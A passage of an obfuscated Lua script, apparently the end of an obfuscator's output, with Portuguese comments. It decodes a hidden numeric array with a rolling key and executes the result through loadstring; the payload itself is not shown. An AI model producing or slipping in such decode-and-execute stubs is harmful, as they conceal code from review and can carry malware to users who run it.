    local function VM_10O1(d, k, m)
        local R_0ll0O = {}
        local c_key = k
        local char = string.char
        local insert = table.insert
        
        -- Virtual Machine Loop
        for idx = 1, #d do
            local val = d[idx]
            -- Decodificacao Rolling Key
            local dec = (val / m) - c_key
            
            -- Anti-Crash Mobile (Garante byte valido)
            dec = dec % 256
            
            insert(R_0ll0O, char(dec))
            
            -- Atualiza a chave para o proximo (Rolling)
            c_key = (c_key + 13) % 150
        end
        return table.concat(R_0ll0O)
    end

    -- Execution Guard
    local F_ll0OI = loadstring(VM_10O1(B_I1IlO0, 10, 5))
    if F_ll0OI then
        F_ll0OI(...)
    end
end)(...)
